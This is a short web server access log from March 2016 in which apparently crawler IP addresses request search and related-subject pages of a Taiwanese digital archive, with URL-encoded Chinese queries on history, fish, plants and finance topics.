66.249.75.251 - - [30/Mar/2016:14:37:08 +0800] "GET /content/subject/resource_content.jsp?oid=16777706&queryType=qs&queryString=%E5%8F%B0%E7%81%A3%E7%B8%BD%E7%9D%A3%E5%BA%9C HTTP/1.1" 200 53850
66.249.69.25 - - [30/Mar/2016:14:37:38 +0800] "GET /digiarch_en/content/repository/resource_content.jsp?oid=1530915&queryString=%E8%83%A1%E9%81%A9%E4%B9%8B%20%E8%AD%B0%E9%95%B7%20%E9%BB%83%E6%9C%9D%E7%90%B4 HTTP/1.1" 200 29989
66.249.69.17 - - [30/Mar/2016:14:37:52 +0800] "GET /content/subject/resource_content.jsp?oid=16777475&queryString=%E5%A4%9A%E6%A8%A3%E6%80%A7%20%E6%96%87%E5%8C%96%E4%B8%AD%E5%BF%83%20%E6%B5%B7%E9%AE%AE%20%E7%94%9F%E7%89%A9%E5%A4%9A%E6%A8%A3%E6%80%A7 HTTP/1.1" 200 62183
66.249.69.9 - - [30/Mar/2016:14:38:04 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E4%BA%BA%E5%90%8D%E6%AC%8A%E5%A8%81+%E8%88%92%E7%88%BE%E6%9B%BC+&oid=633410 HTTP/1.1" 200 3213
66.249.69.9 - - [30/Mar/2016:14:38:06 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E4%BA%BA%E5%90%8D%E6%AC%8A%E5%A8%81%20%E8%88%92%E7%88%BE%E6%9B%BC%20&oid=633410 HTTP/1.1" 200 3213
66.249.69.87 - - [30/Mar/2016:14:38:08 +0800] "GET /digiarch3/content/nav/relationSubject.jsp?relationWords=ATM+%E4%BE%BF%E6%B0%91+%E4%BF%A1%E8%A8%97+%E5%80%89%E5%BA%AB%E6%A5%AD+%E5%93%81%E7%AE%A1%E5%9C%88+%E5%93%81%E8%B3%AA+%E5%9C%8B%E9%9A%9B%E9%87%91%E8%9E%8D+%E5%A4%96%E5%8C%AF+%E5%AD%98%E6%AC%BE+%E5%BE%B5%E4%BF%A1+%E6%8E%88%E4%BF%A1+%E6%94%BE%E6%AC%BE%E6%A5%AD%E5%8B%99+%E6%95%88%E7%8E%87+%E7%9B%AE%E6%A8%99+%E7%B5%90%E8%AA%9E+%E7%B5%B1%E4%B8%80%E7%99%BC%E7%A5%A8+%E8%87%BA%E9%9B%BB+%E8%8F%AF%E5%8D%97%E9%8A%80%E8%A1%8C+%E8%9E%8D%E8%B3%87+%E9%87%91%E8%9E%8D+%E9%87%91%E8%9E%8D%E6%A5%AD+%E9%87%91%E8%9E%8D%E6%A5%AD%E5%8B%99+%E9%A0%90%E7%AE%97+&oid=1597770 HTTP/1.1" 200 7177
66.249.69.87 - - [30/Mar/2016:14:38:10 +0800] "GET /digiarch3/content/nav/relationSubject.jsp?relationWords=%E5%87%B9%E5%B0%BE%E5%A1%98%E9%B1%A7+%E5%96%AE%E9%B0%AD+%E5%96%AE%E9%B0%AD%E5%87%B9%E5%B0%BE%E5%A1%98%E9%B1%A7+%E5%96%AE%E9%B0%AD%E9%B0%AD%E5%A1%98%E9%B1%A7+%E5%A1%98%E9%B1%A7+%E9%B1%A7%E7%A7%91+&oid=1081657 HTTP/1.1" 200 3681
66.249.69.87 - - [30/Mar/2016:14:38:11 +0800] "GET /digiarch3/content/nav/relationSubject.jsp?relationWords=ATM%20%E4%BE%BF%E6%B0%91%20%E4%BF%A1%E8%A8%97%20%E5%80%89%E5%BA%AB%E6%A5%AD%20%E5%93%81%E7%AE%A1%E5%9C%88%20%E5%93%81%E8%B3%AA%20%E5%9C%8B%E9%9A%9B%E9%87%91%E8%9E%8D%20%E5%A4%96%E5%8C%AF%20%E5%AD%98%E6%AC%BE%20%E5%BE%B5%E4%BF%A1%20%E6%8E%88%E4%BF%A1%20%E6%94%BE%E6%AC%BE%E6%A5%AD%E5%8B%99%20%E6%95%88%E7%8E%87%20%E7%9B%AE%E6%A8%99%20%E7%B5%90%E8%AA%9E%20%E7%B5%B1%E4%B8%80%E7%99%BC%E7%A5%A8%20%E8%87%BA%E9%9B%BB%20%E8%8F%AF%E5%8D%97%E9%8A%80%E8%A1%8C%20%E8%9E%8D%E8%B3%87%20%E9%87%91%E8%9E%8D%20%E9%87%91%E8%9E%8D%E6%A5%AD%20%E9%87%91%E8%9E%8D%E6%A5%AD%E5%8B%99%20%E9%A0%90%E7%AE%97%20&oid=1597770 HTTP/1.1" 200 7177
66.249.69.87 - - [30/Mar/2016:14:38:13 +0800] "GET /digiarch3/content/nav/relationSubject.jsp?relationWords=%E5%87%B9%E5%B0%BE%E5%A1%98%E9%B1%A7%20%E5%96%AE%E9%B0%AD%20%E5%96%AE%E9%B0%AD%E5%87%B9%E5%B0%BE%E5%A1%98%E9%B1%A7%20%E5%96%AE%E9%B0%AD%E9%B0%AD%E5%A1%98%E9%B1%A7%20%E5%A1%98%E9%B1%A7%20%E9%B1%A7%E7%A7%91%20&oid=1081657 HTTP/1.1" 200 3681
66.249.75.251 - - [30/Mar/2016:14:38:36 +0800] "GET /content/subject/resource_content.jsp?oid=16777334&queryType=qc HTTP/1.1" 200 27790
66.249.69.182 - - [30/Mar/2016:14:39:20 +0800] "GET /content/repository/resource_content.jsp?oid=2681567&queryType=qs&queryString=%E9%80%86%E7%8A%AF HTTP/1.1" 200 30303
66.249.69.102 - - [30/Mar/2016:14:39:22 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E5%8D%97%E6%B4%8B%E9%AF%BD%E4%BB%94+%E5%8F%A3%E5%AD%B5%E9%AD%9A+%E5%90%B3%E9%83%AD%E9%AD%9A+%E5%B0%BC%E7%BE%85%E5%8F%A3%E5%AD%B5%E9%AD%9A+%E5%B0%BC%E7%BE%85%E5%90%B3%E9%83%AD%E9%AD%9A+%E6%85%88%E9%AF%9B+%E6%85%88%E9%AF%9B%E7%A7%91+%E9%AF%9B%E7%A7%91+%E9%AF%BD%E4%BB%94+&oid=15605 HTTP/1.1" 200 3978
66.249.69.118 - - [30/Mar/2016:14:39:24 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E5%8D%97%E6%B4%8B%E9%AF%BD%E4%BB%94%20%E5%8F%A3%E5%AD%B5%E9%AD%9A%20%E5%90%B3%E9%83%AD%E9%AD%9A%20%E5%B0%BC%E7%BE%85%E5%8F%A3%E5%AD%B5%E9%AD%9A%20%E5%B0%BC%E7%BE%85%E5%90%B3%E9%83%AD%E9%AD%9A%20%E6%85%88%E9%AF%9B%20%E6%85%88%E9%AF%9B%E7%A7%91%20%E9%AF%9B%E7%A7%91%20%E9%AF%BD%E4%BB%94%20&oid=15605 HTTP/1.1" 200 3978
66.249.69.87 - - [30/Mar/2016:14:39:47 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E9%99%B6%E7%BD%90+&oid=4411601 HTTP/1.1" 200 3008
66.249.69.87 - - [30/Mar/2016:14:39:49 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E9%99%B6%E7%BD%90%20&oid=4411601 HTTP/1.1" 200 3008
66.249.69.102 - - [30/Mar/2016:14:39:52 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E5%8F%B0%E7%81%A3%E9%87%8E%E8%96%84%E8%8D%B7%20%E5%94%87%E5%BD%A2%E7%A7%91%20%E6%A4%8D%E7%89%A9%E7%95%8C%20%E8%96%84%E8%8D%B7%20%E9%87%8E%E8%96%84%E8%8D%B7%E5%B1%AC%20%E9%9B%99%E5%AD%90%E8%91%89%E6%A4%8D%E7%89%A9%20&oid=2151525 HTTP/1.1" 200 3480
66.249.69.187 - - [30/Mar/2016:14:40:04 +0800] "GET /content/repository/resource_content.jsp?oid=2515201&queryType=qs&queryString=%E9%9B%B2%E5%8D%97%E7%9C%81%E5%9F%8E HTTP/1.1" 200 30030
66.249.69.9 - - [30/Mar/2016:14:40:06 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E4%B9%9D%E6%A3%98+%E6%A0%BC%E4%BB%94+%E7%9F%B3%E6%96%91+%E7%B4%85%E9%B1%A0+%E9%81%8E%E9%AD%9A+%E9%9D%92%E6%98%9F%E4%B9%9D%E5%88%BA%E9%AE%A8+%E9%AE%A8%E7%A7%91+&oid=14979 HTTP/1.1" 200 3884
66.249.69.9 - - [30/Mar/2016:14:40:08 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E4%B9%9D%E6%A3%98%20%E6%A0%BC%E4%BB%94%20%E7%9F%B3%E6%96%91%20%E7%B4%85%E9%B1%A0%20%E9%81%8E%E9%AD%9A%20%E9%9D%92%E6%98%9F%E4%B9%9D%E5%88%BA%E9%AE%A8%20%E9%AE%A8%E7%A7%91%20&oid=14979 HTTP/1.1" 200 3884
